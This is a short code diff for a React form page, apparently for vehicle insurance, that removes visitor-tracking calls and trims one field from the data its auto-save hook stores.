@@ -5,8 +5,6 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import {
   getOrCreateVisitorID,
-  initializeVisitorTracking,
-  updateVisitorPage,
 } from "@/lib/visitor-tracking";
 import { addData } from "@/lib/firebase";
 import { useAutoSave } from "@/hooks/use-auto-save";
@@ -62,18 +60,13 @@ export default function Home() {
 
   useEffect(() => {
     if (!visitorID) return;
-    const init = async () => {
-      await initializeVisitorTracking(visitorID);
-      await updateVisitorPage(visitorID, "home-new", 1);
-      setVisitorInitialized(true);
-    };
-    init();
+    setVisitorInitialized(true);
   }, [visitorID]);
 
   useAutoSave({
     visitorId: visitorInitialized ? visitorID : "",
     pageName: "home",
-    data: { identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber, activeTab },
+    data: { identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber },
   });
 
   const fetchVehicles = useCallback(async (nin: string) => {
